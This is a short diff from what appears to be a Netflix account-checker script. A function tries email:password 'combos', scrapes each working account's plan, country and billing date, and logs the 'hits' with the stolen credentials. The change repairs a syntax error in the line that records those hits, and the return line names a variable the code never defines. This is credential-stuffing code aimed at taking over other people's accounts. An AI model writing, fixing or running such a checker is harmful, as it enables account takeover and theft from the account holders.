@@ -311,7 +311,7 @@ def netflix_login(combos):
                 country = info.split('","currentCountry":"')[1].split('"')[0]
                 expiry = info.split('data-uia="nextBillingDate-item">')[1].split('<')[0]
                 hits += 1
-                results.append({"email": combo.split(":")[0], "password": combo.split(":")[1], "plan": plan, "country"; country, "expiry": expiry})
+                results.append({"email": combo.split(":")[0], "password": combo.split(":")[1], "plan": plan, "country": country, "expiry": expiry})
  return result, hits, bad
                 
    
